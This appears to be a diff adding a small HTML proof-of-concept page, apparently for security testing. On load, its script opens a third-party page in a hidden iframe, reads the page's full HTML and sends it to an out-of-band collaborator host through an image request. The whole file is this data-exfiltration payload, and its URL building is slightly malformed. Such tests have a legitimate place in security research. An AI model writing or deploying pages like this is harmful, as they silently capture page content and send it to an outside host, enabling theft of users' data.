@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Load Form and Capture Response</title>
+    <script>
+        // Function to load a form and capture response
+        function loadFormAndCapture() {
+            // Create a hidden iframe
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+
+            // Function to capture response
+            function captureResponse(response) {
+                // Send the response to the Burp Suite collaborator
+                var img = new Image();
+                img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro" + encodeURIComponent(response);
+            }
+
+            // Set up iframe load event listener
+            iframe.onload = function() {
+                // Wait for a brief moment to allow form to load
+                setTimeout(function() {
+                    // Capture the response
+                    var response = iframe.contentDocument.documentElement.outerHTML;
+                    captureResponse(response);
+                    // Remove the iframe
+                    document.body.removeChild(iframe);
+                }, 1000); // Adjust the delay as needed
+            };
+
+            // Set the iframe source to a URL containing a form
+            iframe.src = 'https://drwhitehack.github.io/Test/';
+        }
+
+        // Call the function when the page loads
+        window.onload = function() {
+            loadFormAndCapture();
+        };
+    </script>
+</head>
+<body>
+    <h1>Loading Form...</h1>
+</body>
+</html>
